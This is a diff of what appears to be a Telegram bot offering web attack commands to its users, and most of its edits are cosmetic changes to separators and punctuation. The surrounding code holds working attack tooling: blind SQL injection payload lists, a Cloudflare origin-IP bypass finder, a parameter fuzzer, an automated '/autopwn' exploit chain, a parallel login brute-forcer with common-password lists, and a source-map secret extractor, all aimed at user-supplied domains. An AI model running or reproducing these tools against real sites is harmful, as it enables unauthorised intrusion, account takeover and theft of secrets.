+    # ── MariaDB specific ──────────────────────────────────────────────
     "1' PROCEDURE ANALYSE()--",
     "' AND BENCHMARK(1000000,MD5('x'))--",
 ]
 
 _SQLI_PAYLOADS_BLIND = [
-    # -- Time-based (MySQL) --------------------------------------------
+    # ── Time-based (MySQL) ────────────────────────────────────────────
     ("1' AND SLEEP(2)--",                           2.0),
     ("1' AND SLEEP(2)#",                            2.0),
     ("1') AND SLEEP(2)--",                          2.0),
@@ -15932,26 +16182,26 @@ _SQLI_PAYLOADS_BLIND = [
     ("1' AND SLEEP(2)-- -",                         2.0),
     ("1;SELECT SLEEP(2)--",                         2.0),
     ("1' AND BENCHMARK(2000000,MD5(1))--",          2.0),  # CPU-based delay
-    # -- Time-based (PostgreSQL) --------------------------------------
+    # ── Time-based (PostgreSQL) ──────────────────────────────────────
     ("1' AND pg_sleep(2)--",                        2.0),
     ("1'; SELECT pg_sleep(2)--",                    2.0),
     ("1' AND (SELECT 1 FROM pg_sleep(2))--",        2.0),
     ("1;SELECT pg_sleep(2)--",                      2.0),
-    # -- Time-based (MSSQL) -------------------------------------------
+    # ── Time-based (MSSQL) ───────────────────────────────────────────
     ("1'; WAITFOR DELAY '0:0:2'--",                 2.0),
     ("1' WAITFOR DELAY '0:0:2'--",                  2.0),
     ("'; WAITFOR DELAY '0:0:2'--",                  2.0),
     ("1;WAITFOR DELAY '0:0:2'--",                   2.0),
-    # -- Time-based (Oracle) ------------------------------------------
+    # ── Time-based (Oracle) ──────────────────────────────────────────
     ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)--", 2.0),
     ("1' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)--",  2.0),
-    # -- Time-based (SQLite) ------------------------------------------
+    # ── Time-based (SQLite) ──────────────────────────────────────────
     ("1' AND 1=RANDOMBLOB(100000000)--",             2.0),
     ("1 AND 1=RANDOMBLOB(100000000)",                2.0),
-    # -- Time-based (MariaDB) -----------------------------------------
+    # ── Time-based (MariaDB) ─────────────────────────────────────────
     ("1' AND SLEEP(2)/*comment*/--",                 2.0),
     ("1' AND (SELECT 1 FROM (SELECT SLEEP(2)) t)--", 2.0),
-    # -- Boolean-based -------------------------------------------------
+    # ── Boolean-based ─────────────────────────────────────────────────
     ("1 AND 1=1",                               None),
     ("1 AND 1=0",                               None),
     ("1' AND '1'='1",                           None),
@@ -15998,7 +16248,7 @@ def _cloudcheck_sync(domain: str, progress_q: list) -> dict:
         "shodan_hint": "",
     }
 
-    # -- Step 1: Current IP + CDN detect -----------
+    # ── Step 1: Current IP + CDN detect ───────────
     progress_q.append("🔍 Resolving current IP + CDN check...")
     try:
         current_ip = socket.gethostbyname(domain)
@@ -16029,7 +16279,7 @@ def _cloudcheck_sync(domain: str, progress_q: list) -> dict:
 
     cf_ranges = results["cdn_detected"]  # reference for later use
 
-    # -- Step 2: MX records (often direct IP) -------
+    # ── Step 2: MX records (often direct IP) ───────
     progress_q.append("📧 Checking MX records...")
     try:
         import subprocess as _sp
@@ -16052,7 +16302,7 @@ def _cloudcheck_sync(domain: str, progress_q: list) -> dict:
     except Exception as _e:
         logging.debug("Scan error: %s", _e)
 
-    # -- Step 3: Common subdomains that might bypass -
+    # ── Step 3: Common subdomains that might bypass ─
     progress_q.append("🌐 Checking subdomains for direct IPs...")
     bypass_subs = ["mail", "smtp", "ftp", "cpanel", "webmail", "direct",
                    "origin", "backend", "api", "dev", "staging", "old",
@@ -16076,7 +16326,7 @@ def _cloudcheck_sync(domain: str, progress_q: list) -> dict:
             logging.debug("Scan error: %s", _e)
     progress_q.append(f"✅ Subdomains: `{sub_found}` resolved")
 
-    # -- Step 4: Try historical DNS (SecurityTrails-style via public APIs) --
+    # ── Step 4: Try historical DNS (SecurityTrails-style via public APIs) ──
     progress_q.append("📚 Checking public passive DNS sources...")
     try:
         # HackerTarget passive DNS
@@ -16105,7 +16355,7 @@ def _cloudcheck_sync(domain: str, progress_q: list) -> dict:
     except Exception as _e:
         logging.debug("Scan error: %s", _e)
 
-    # -- Step 5: Test direct IP access -------------
+    # ── Step 5: Test direct IP access ─────────────
     progress_q.append("🔗 Testing direct IP connections...")
     unique_candidates = list({c["ip"]: c for c in results["real_ip_candidates"]}.values())
     for cand in unique_candidates[:5]:
@@ -16122,7 +16372,7 @@ def _cloudcheck_sync(domain: str, progress_q: list) -> dict:
         except Exception as _e:
             logging.debug("Scan error: %s", _e)
 
-    # -- Step 6: IPv6 real IP detection -----------
+    # ── Step 6: IPv6 real IP detection ───────────
     progress_q.append("🔢 Checking IPv6 addresses (CDN bypass)...")
     try:
         import socket as _sock
@@ -16151,7 +16401,7 @@ def _cloudcheck_sync(domain: str, progress_q: list) -> dict:
 
 
 async def cmd_cloudcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/cloudcheck <domain> - Find real IP behind Cloudflare/CDN"""
+    """/cloudcheck <domain> — Find real IP behind Cloudflare/CDN"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -16186,17 +16436,17 @@ async def cmd_cloudcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as _e:
         logging.debug("Scan error: %s", _e)
 
-    # -- Concurrent scan limit ---------------------
+    # ── Concurrent scan limit ─────────────────────
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             f"သို့မဟုတ် `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
     _active_scans.set(uid, "CloudCheck")
 
     msg = await update.effective_message.reply_text(
-        f"☁️ *Cloud/CDN Bypass   `{raw}`*\n\n"
+        f"☁️ *Cloud/CDN Bypass — `{raw}`*\n\n"
         "⣾ *Email Intel*\n\n_① MX records → ② Subdomains → ③ Passive DNS..._",
         parse_mode='Markdown'
     )
@@ -16208,7 +16458,7 @@ async def cmd_cloudcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if progress_q:
                 txt = progress_q[-1]; progress_q.clear()
                 try:
-                    await msg.edit_text(f"☁️ *CloudCheck   `{raw}`*\n\n{txt}", parse_mode='Markdown')
+                    await msg.edit_text(f"☁️ *CloudCheck — `{raw}`*\n\n{txt}", parse_mode='Markdown')
                 except Exception: pass
 
     prog = asyncio.create_task(_prog())
@@ -16225,8 +16475,8 @@ async def cmd_cloudcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     candidates = data.get("real_ip_candidates", [])
     lines = [
-        f"☁️ *Cloud/CDN Bypass   `{raw}`*",
-        "--------------------",
+        f"☁️ *Cloud/CDN Bypass — `{raw}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"🌐 Current IP: `{data.get('current_ip','?')}`",
         f"🛡 CDN: `{'`, `'.join(data['cdn_detected']) if data['cdn_detected'] else 'Not detected'}`",
         "",
@@ -16241,7 +16491,7 @@ async def cmd_cloudcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if candidates:
         lines.append(f"*🎯 Real IP Candidates ({len(candidates)}):*")
         for c in candidates[:8]:
-            lines.append(f"  🔴 `{c['ip']}`   via {c['source']}")
+            lines.append(f"  🔴 `{c['ip']}` — via {c['source']}")
         lines.append("")
     else:
         lines.append("*🔒 No bypass candidates found*\n_(Cloudflare properly configured)_\n")
@@ -16270,14 +16520,14 @@ async def cmd_cloudcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_document(
         chat_id=update.effective_chat.id, document=_rb,
         filename=f"cloudcheck_{_sd}_{_ts}.json",
-        caption=f"☁️ CloudCheck Report   `{raw}`\nReal IPs: `{len(data.get('real_ip_candidates',[]))}`",
+        caption=f"☁️ CloudCheck Report — `{raw}`\nReal IPs: `{len(data.get('real_ip_candidates',[]))}`",
         parse_mode='Markdown'
     )
 
 
-# ==================================================
-# ⑤ /paramfuzz   Advanced Parameter Fuzzer (Arjun-style)
-# ==================================================
+# ══════════════════════════════════════════════════
+# ⑤ /paramfuzz — Advanced Parameter Fuzzer (Arjun-style)
+# ══════════════════════════════════════════════════
 
 _PARAMFUZZ_WORDLIST = [
     # Auth / User
@@ -16312,7 +16562,7 @@ _PARAMFUZZ_WORDLIST = [
 ]
 
 def _paramfuzz_sync(url: str, method: str, progress_q: list) -> dict:
-    """Advanced parameter discovery - Arjun-style."""
+    """Advanced parameter discovery — Arjun-style."""
     results = {
         "found_params": [],
         "method": method,
@@ -16331,7 +16581,7 @@ def _paramfuzz_sync(url: str, method: str, progress_q: list) -> dict:
 
     progress_q.append(f"🧪 Testing `{len(_PARAMFUZZ_WORDLIST)}` params [{method}]...")
 
-    # -- Baseline request ---------------------------
+    # ── Baseline request ───────────────────────────
     try:
         if method == "GET":
             r_base = requests.get(base, params=existing, headers=_get_headers(),
@@ -16398,7 +16648,7 @@ def _paramfuzz_sync(url: str, method: str, progress_q: list) -> dict:
         except Exception as _e:
             logging.debug("Scan error: %s", _e)
 
-    # -- Classify interesting params ----------------
+    # ── Classify interesting params ────────────────
     interesting_names = {
         "file", "path", "url", "redirect", "goto", "next", "src", "dest",
         "include", "require", "load", "cmd", "command", "exec", "shell",
@@ -16414,7 +16664,7 @@ def _paramfuzz_sync(url: str, method: str, progress_q: list) -> dict:
 
 
 async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/paramfuzz <url> [get|post] - Advanced parameter discovery"""
+    """/paramfuzz <url> [get|post] — Advanced parameter discovery"""
     global scan_semaphore, db_lock
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
@@ -16448,10 +16698,10 @@ async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
         return
 
-    # -- Concurrent scan limit ---------------------
+    # ── Concurrent scan limit ─────────────────────
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             f"သို့မဟုတ် `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
@@ -16459,7 +16709,7 @@ async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = urlparse(url).hostname
     msg = await update.effective_message.reply_text(
-        f"🔬 *ParamFuzz   `{domain}`* [{method}]\n\n"
+        f"🔬 *ParamFuzz — `{domain}`* [{method}]\n\n"
         f"⣾ *Param Fuzzer*\n\n_Testing `{len(_PARAMFUZZ_WORDLIST)}` parameters..._",
         parse_mode='Markdown'
     )
@@ -16472,14 +16722,14 @@ async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 txt = progress_q[-1]; progress_q.clear()
                 try:
                     await msg.edit_text(
-                        f"🔬 *ParamFuzz   `{domain}`* [{method}]\n\n{txt}", parse_mode='Markdown')
+                        f"🔬 *ParamFuzz — `{domain}`* [{method}]\n\n{txt}", parse_mode='Markdown')
                 except Exception: pass
 
     prog = asyncio.create_task(_prog())
-    # -- Queue notification: show message if scan is already running --
+    # ── Queue notification: show message if scan is already running ──
     if scan_semaphore._value == 0:
         await update.effective_message.reply_text(
-            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည်   ပြီးမှ အလိုအလျောက် စမည်\n"
+            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
             "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
             parse_mode='Markdown'
         )
@@ -16499,8 +16749,8 @@ async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
     interesting = data["interesting"]
 
     lines = [
-        f"🔬 *ParamFuzz Results   `{domain}`*",
-        "--------------------",
+        f"🔬 *ParamFuzz Results — `{domain}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"Method: `{method}` | Tested: `{data['total_tested']}`",
         f"Found: `{len(found)}` params | 🔴 Interesting: `{len(interesting)}`",
         "",
@@ -16510,7 +16760,7 @@ async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lines.append("*🔴 High-Interest Parameters:*")
         for p in interesting[:10]:
             diff_str = f"+{p['size_diff']}B" if p['size_diff'] else f"status {p['status']}"
-            lines.append(f"  ⚠️ `{p['param']}`   {diff_str}")
+            lines.append(f"  ⚠️ `{p['param']}` — {diff_str}")
         lines.append("")
 
     if found:
@@ -16526,13 +16776,13 @@ async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
-    # -- Export ALL results as TXT (full URLs)   no truncation --
+    # ── Export ALL results as TXT (full URLs) — no truncation ──
     if found:
         import io as _io
         _ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
         _sd  = re.sub(r'[^\w\-]', '_', domain)
         _txt = [
-            f"# ParamFuzz Results   {url}",
+            f"# ParamFuzz Results — {url}",
             f"# Method: {method} | Tested: {data['total_tested']} | Found: {len(found)} | Interesting: {len(interesting)}",
             f"# Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             "",
@@ -16554,16 +16804,16 @@ async def cmd_paramfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
             document=_rb,
             filename=f"paramfuzz_{_sd}_{_ts}.txt",
             caption=(
-                f"📄 *ParamFuzz Export   `{domain}`*\n"
+                f"📄 *ParamFuzz Export — `{domain}`*\n"
                 f"🔴 Interesting: `{len(interesting)}` | ✅ Total: `{len(found)}`"
             ),
             parse_mode='Markdown'
         )
 
 
-# ==================================================
-# 🔑 _extract_secrets_sync   used by /autopwn Phase 3
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🔑 _extract_secrets_sync — used by /autopwn Phase 3
+# ══════════════════════════════════════════════════
 
 def _extract_secrets_sync(url: str, progress_q: list) -> dict:
     """Lightweight secret scan for /autopwn Phase 3."""
@@ -16604,12 +16854,12 @@ def _extract_secrets_sync(url: str, progress_q: list) -> dict:
         results["error"] = str(e)
     return results
 
-# ==================================================
-# ⑥ /autopwn   Full Auto Exploit Chain
-# ==================================================
+# ══════════════════════════════════════════════════
+# ⑥ /autopwn — Full Auto Exploit Chain
+# ══════════════════════════════════════════════════
 
 async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/autopwn <url> - Full automated pentest chain"""
+    """/autopwn <url> — Full automated pentest chain"""
     global db_lock
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
@@ -16642,10 +16892,10 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
         return
 
-    # -- Concurrent scan limit ---------------------
+    # ── Concurrent scan limit ─────────────────────
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             f"သို့မဟုတ် `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
@@ -16654,7 +16904,7 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         domain = urlparse(url).hostname
         msg = await update.effective_message.reply_text(
-            f"🤖 *AutoPwn   `{domain}`*\n\n"
+            f"🤖 *AutoPwn — `{domain}`*\n\n"
             "Phase 1/7: TechStack... ⏳",
             parse_mode='Markdown'
         )
@@ -16684,13 +16934,13 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 history = "\n".join(f"  ✔ `{p}`" for p in _phase_done[-4:]) + "\n\n"
             try:
                 await msg.edit_text(
-                    f"🤖 *AutoPwn   `{domain}`*\n\n{history}⏳ {text}",
+                    f"🤖 *AutoPwn — `{domain}`*\n\n{history}⏳ {text}",
                     parse_mode='Markdown'
                 )
             except Exception as _e:
                 logging.debug("autopwn update error: %s", _e)
 
-        # -- Phase 1: TechStack -------------------------
+        # ── Phase 1: TechStack ─────────────────────────
         await _update("Phase 1/7: 🔍 TechStack fingerprint...")
         try:
             pq = []
@@ -16700,7 +16950,7 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await _update(f"Phase 1/7: ⚠️ Tech error: `{e}`\nPhase 2/7: 🧪 Fuzzing...")
 
-        # -- Phase 2: Path Fuzz -------------------------
+        # ── Phase 2: Path Fuzz ─────────────────────────
         try:
             base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
             pq = []
@@ -16719,7 +16969,7 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await _update(f"Phase 2/7: ⚠️ Fuzz err: `{type(e).__name__}`\nPhase 3/7: 🔑 Secret scanning...")
 
-        # -- Phase 3: Secrets ---------------------------
+        # ── Phase 3: Secrets ───────────────────────────
         try:
             pq = []
             secret_data = await asyncio.to_thread(_extract_secrets_sync, url, pq)
@@ -16736,7 +16986,7 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await _update(f"Phase 3/7: ⚠️ Secrets err: `{type(e).__name__}`\nPhase 4/7: 💉 SQLi testing...")
 
-        # -- Phase 4: SQLi ------------------------------
+        # ── Phase 4: SQLi ──────────────────────────────
         try:
             pq = []
             sqli_data = {'total_found': 0, 'db_type': 'N/A', 'note': 'sqli removed'}
@@ -16751,7 +17001,7 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await _update(f"Phase 4/7: ⚠️ SQLi err: `{type(e).__name__}`\nPhase 5/7: 🎯 XSS scanning...")
 
-        # -- Phase 5: XSS ------------------------------
+        # ── Phase 5: XSS ──────────────────────────────
         try:
             pq = []
             xss_data = {'total_found': 0, 'note': 'xss removed'}
@@ -16766,7 +17016,7 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await _update(f"Phase 5/7: ⚠️ XSS err: `{type(e).__name__}`\nPhase 6/7: 🔬 Parameters...")
 
-        # -- Phase 6: ParamFuzz -------------------------
+        # ── Phase 6: ParamFuzz ─────────────────────────
         try:
             pq = []
             param_data = await asyncio.to_thread(_paramfuzz_sync, url, "GET", pq)
@@ -16782,7 +17032,7 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await _update(f"Phase 6/7: ⚠️ Params err: `{type(e).__name__}`\nPhase 7/7: 📊 Report...")
 
-        # -- Phase 7: Report ----------------------------
+        # ── Phase 7: Report ────────────────────────────
         risk = report["risk_score"]
         if risk >= 80:
             risk_level = "🔴 CRITICAL"
@@ -16797,9 +17047,9 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         fuzz_200 = [f for f in report["fuzz"] if f["status"] == 200]
 
         lines = [
-            f"🤖 *AutoPwn Complete   `{domain}`*",
-            "--------------------",
-            f"🎯 Risk Score: `{risk}/100`   {risk_level}",
+            f"🤖 *AutoPwn Complete — `{domain}`*",
+            "━━━━━━━━━━━━━━━━━━━━",
+            f"🎯 Risk Score: `{risk}/100` — {risk_level}",
             f"⏰ Scanned: `{report['scanned_at']}`",
             "",
             "*📊 Summary:*",
@@ -16845,7 +17095,7 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
             document=report_buf,
             filename=f"autopwn_{safe_dom}_{ts}.json",
             caption=(
-                f"📊 *AutoPwn Report   `{domain}`*\n"
+                f"📊 *AutoPwn Report — `{domain}`*\n"
                 f"Risk: {risk_level} | Score: `{risk}/100`\n"
                 f"Vulnerabilities: `{len(report['vulns'])}`"
             ),
@@ -16856,10 +17106,10 @@ async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _active_scans.pop(uid, None)
 
 
-# ==================================================
-# ======================================================================
-# 🔐 FEATURE #29   /bruteforce  Login Brute Force (rate-limit aware)
-# ======================================================================
+# ══════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════
+# 🔐 FEATURE #29 — /bruteforce  Login Brute Force (rate-limit aware)
+# ══════════════════════════════════════════════════════════════════════
 
 _COMMON_PASSWORDS = [
     # Top universal
@@ -16909,7 +17159,7 @@ _COMMON_USERNAMES = [
 
 def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
                      usernames: list, passwords: list, progress_q: list) -> dict:
-    """Smart login brute force - parallel + JSON API auto-detect + cookie change detection."""
+    """Smart login brute force — parallel + JSON API auto-detect + cookie change detection."""
     results = {
         "login_url":        login_url,
         "tested":           0,
@@ -16924,7 +17174,7 @@ def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
     session.headers.update(_get_headers())
     session.verify = False
 
-    # -- Baseline: failed login response ------------
+    # ── Baseline: failed login response ────────────
     try:
         baseline_resp = session.post(login_url, data={
             username_field: "zz_invalid_user_zz",
@@ -16939,7 +17189,7 @@ def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
         results["errors"].append(f"Baseline failed: {e}")
         return results
 
-    # -- Auto-detect JSON API -----------------------
+    # ── Auto-detect JSON API ───────────────────────
     try:
         json_test = session.post(
             login_url,
@@ -16950,15 +17200,15 @@ def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
         if json_test.status_code not in (415, 400) and \
            "application/json" in json_test.headers.get("Content-Type",""):
             results["json_api"] = True
-            progress_q.append("🔌 JSON API detected   using JSON body")
+            progress_q.append("🔌 JSON API detected — using JSON body")
     except Exception:
         pass
 
-    # -- CAPTCHA detection --------------------------
+    # ── CAPTCHA detection ──────────────────────────
     captcha_hints = ["captcha","recaptcha","hcaptcha","turnstile","i am not a robot","cf-turnstile"]
     if any(h in baseline_resp.text.lower() for h in captcha_hints):
         results["captcha_detected"] = True
-        progress_q.append("⚠️ CAPTCHA detected   brute limited")
+        progress_q.append("⚠️ CAPTCHA detected — brute limited")
 
     total_attempts = min(len(usernames) * len(passwords), 300)
     consecutive_429 = 0
@@ -17002,7 +17252,7 @@ def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
                 results["lockout_detected"] = True
                 return None
 
-            # Success detection   multi-signal
+            # Success detection — multi-signal
             body_len_diff = abs(len(resp.text) - baseline_len)
             url_changed   = resp.url != baseline_url
             code_changed  = resp.status_code != baseline_code
@@ -17044,7 +17294,7 @@ def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
             results["errors"].append(str(e)[:60])
         return None
 
-    # -- Parallel credential testing (3 threads) ----
+    # ── Parallel credential testing (3 threads) ────
     import threading
     pairs = [(u, p) for u in usernames for p in passwords][:total_attempts]
     tested = 0
@@ -17065,7 +17315,7 @@ def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
                 break
             if consecutive_429 >= 5:
                 results["rate_limited"] = True
-                progress_q.append("🚫 Rate limit hit   stopping")
+                progress_q.append("🚫 Rate limit hit — stopping")
                 break
             time.sleep(0.4)   # Polite delay
 
@@ -17109,10 +17359,10 @@ async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
         return
 
-    # -- Concurrent scan limit ---------------------
+    # ── Concurrent scan limit ─────────────────────
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             f"သို့မဟုတ် `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
@@ -17125,7 +17375,7 @@ async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.get("custom_passwords") or _COMMON_PASSWORDS)
 
     msg = await update.effective_message.reply_text(
-        f"🔐 *Brute Force   `{urlparse(url).hostname}`*\n\n"
+        f"🔐 *Brute Force — `{urlparse(url).hostname}`*\n\n"
         f"Testing `{len(usernames)}` users × `{len(passwords)}` passwords\n"
         f"Fields: `{user_field}` / `{pass_field}`\n⏳ Starting...",
         parse_mode='Markdown'
@@ -17147,7 +17397,7 @@ async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 latest = progress_q[-1]
                 try:
                     await msg.edit_text(
-                        f"🔐 *Brute Force   `{urlparse(url).hostname}`*\n\n{latest}",
+                        f"🔐 *Brute Force — `{urlparse(url).hostname}`*\n\n{latest}",
                         parse_mode='Markdown'
                     )
                 except Exception:
@@ -17164,7 +17414,7 @@ async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _active_scans.pop(uid, None)
 
     domain = urlparse(url).hostname
-    lines  = [f"🔐 *Brute Force Complete   `{domain}`*", "--------------------"]
+    lines  = [f"🔐 *Brute Force Complete — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]
 
     if result["found"]:
         lines.append(f"🔓 *CREDENTIALS FOUND: {len(result['found'])}*")
@@ -17191,13 +17441,13 @@ async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_document(
         chat_id=update.effective_chat.id, document=_rb,
         filename=f"bruteforce_{_sd}_{_ts}.json",
-        caption=f"🔐 Bruteforce   `{urlparse(url).hostname}`\nFound: `{len(result['found'])}`", parse_mode='Markdown'
+        caption=f"🔐 Bruteforce — `{urlparse(url).hostname}`\nFound: `{len(result['found'])}`", parse_mode='Markdown'
     )
     _active_scans.pop(uid, None)
 
 
-# ======================================================================
-# ======================================================================
+# ══════════════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════
 
 def _sourcemap_sync(url: str, progress_q: list) -> dict:
     """Find and extract JS source maps → original source code."""
@@ -17214,7 +17464,7 @@ def _sourcemap_sync(url: str, progress_q: list) -> dict:
     parsed = urlparse(url)
     base   = f"{parsed.scheme}://{parsed.netloc}"
 
-    # -- Step 1: Find all JS files ------------------
+    # ── Step 1: Find all JS files ──────────────────
     progress_q.append("🗺️ Fetching page to find JS files...")
     try:
         resp = session.get(url, timeout=15, allow_redirects=True)
@@ -17241,9 +17491,9 @@ def _sourcemap_sync(url: str, progress_q: list) -> dict:
         if full not in js_urls:
             js_urls.append(full)
 
-    progress_q.append(f"🗺️ Found {len(js_urls)} JS files   checking for .map references...")
+    progress_q.append(f"🗺️ Found {len(js_urls)} JS files — checking for .map references...")
 
-    # -- Step 2: Find .map references --------------
+    # ── Step 2: Find .map references ──────────────
     import zipfile as _zf, io as _io
 
     zip_buf = _io.BytesIO()
@@ -17329,12 +17579,12 @@ def _sourcemap_sync(url: str, progress_q: list) -> dict:
 
     results["total_source_files"] = total_files
     results["zip_buffer"] = zip_buf if total_files > 0 else None
-    progress_q.append(f"🗺️ Done   {total_files} source files extracted")
+    progress_q.append(f"🗺️ Done — {total_files} source files extracted")
     return results
 
 
 async def cmd_sourcemap(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/sourcemap <url> - Extract JS source maps → original source code"""
+    """/sourcemap <url> — Extract JS source maps → original source code"""
     if not await check_force_join(update, context): return
     uid = update.effective_user.id
     allowed, wait = check_rate_limit(uid, heavy=True)
@@ -17364,10 +17614,10 @@ async def cmd_sourcemap(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
         return
 
-    # -- Concurrent scan limit ---------------------
+    # ── Concurrent scan limit ─────────────────────
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   ပြီးဆုံးဖို့ စောင့်ပါ\n"
+            f"⏳ *`{_active_scans.get(uid)}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
             f"သို့မဟုတ် `/stop` နှိပ်ပါ",
             parse_mode='Markdown')
         return
@@ -17375,7 +17625,7 @@ async def cmd_sourcemap(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     domain = urlparse(url).hostname
     msg = await update.effective_message.reply_text(
-        f"🗺️ *Source Map Scan   `{domain}`*\n\n⏳ Scanning JS files...",
+        f"🗺️ *Source Map Scan — `{domain}`*\n\n⏳ Scanning JS files...",
         parse_mode='Markdown'
     )
     progress_q = []
@@ -17387,7 +17637,7 @@ async def cmd_sourcemap(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if len(progress_q) > last:
                 try:
                     await msg.edit_text(
-                        f"🗺️ *Source Map Scan   `{domain}`*\n\n{progress_q[-1]}",
+                        f"🗺️ *Source Map Scan — `{domain}`*\n\n{progress_q[-1]}",
                         parse_mode='Markdown'
                     )
                 except Exception:
@@ -17405,12 +17655,12 @@ async def cmd_sourcemap(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sources = result.get("sources_extracted", [])
     secrets = result.get("secrets_in_source", [])
 
-    lines = [f"🗺️ *Source Map Scan   `{domain}`*", "--------------------"]
+    lines = [f"🗺️ *Source Map Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]
 
     if maps:
         lines.append(f"\n🎯 *Source Maps Found: {len(maps)}*")
         for m in maps:
-            lines.append(f"  📄 `{m['map_url'].split('/')[-1]}`   `{m['source_count']}` source files")
+            lines.append(f"  📄 `{m['map_url'].split('/')[-1]}` — `{m['source_count']}` source files")
         lines.append(f"\n📁 Total source files extracted: `{result['total_source_files']}`")
 
         if sources[:5]:
